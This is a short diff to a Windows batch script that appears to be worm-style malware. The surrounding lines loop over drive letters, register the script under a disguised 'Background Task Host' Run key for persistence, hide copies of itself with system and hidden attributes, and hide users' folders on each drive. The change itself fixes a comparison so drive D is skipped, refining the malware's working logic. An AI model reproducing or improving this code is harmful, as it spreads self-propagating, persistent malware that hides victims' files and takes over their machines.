@@ -92,7 +92,7 @@ for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do (
       reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Background Task Host - %%i" /d "%%i:\%~nx0" /f
       attrib +s +h "%%i:\%~nx0"
 
-      if "%%i:" NEQ "%systemDrive%" if "%%i" NEQ "D" (
+      if "%%i:" NEQ "%systemDrive%" if "%%i:" NEQ "D:" (
         for /f "delims=" %%x in ('dir "%%i:\*" /a:d /b 2^>nul') do (
           if "%%x" NEQ "$RECYCLE.BIN" if "%%x" NEQ "FOUND.000" if "%%x" NEQ "Recycled" if "%%x" NEQ "System Volume Information" (
             attrib +h "%%i:\%%x"
